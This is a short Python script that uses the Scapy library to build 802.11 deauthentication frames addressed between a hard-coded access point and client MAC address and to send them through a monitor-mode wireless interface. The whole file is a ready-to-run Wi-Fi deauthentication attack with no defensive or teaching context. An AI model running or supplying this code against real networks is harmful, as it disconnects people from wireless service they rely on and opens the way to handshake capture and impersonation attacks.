# Import Module
from scapy.all import *


# Access Point MAC Address
ap = "68:A3:78:1D:71:EE"

# Client MAC Address


             # OR

client = "20:F4:78:68:B5:2A"



# Deauthentication Packet For Access Point
pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()

# Deauthentication Packet For Client
#             Use This Option Only If you Have Client MAC Address
pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()


# send Packets To Access Point and 

#           In Arguments, iface = monitor mode enable Interface  
sendp(pkt, iface="wlo1mon")

# send Packet To Client
sendp(pkt1, iface="wlo1mon")


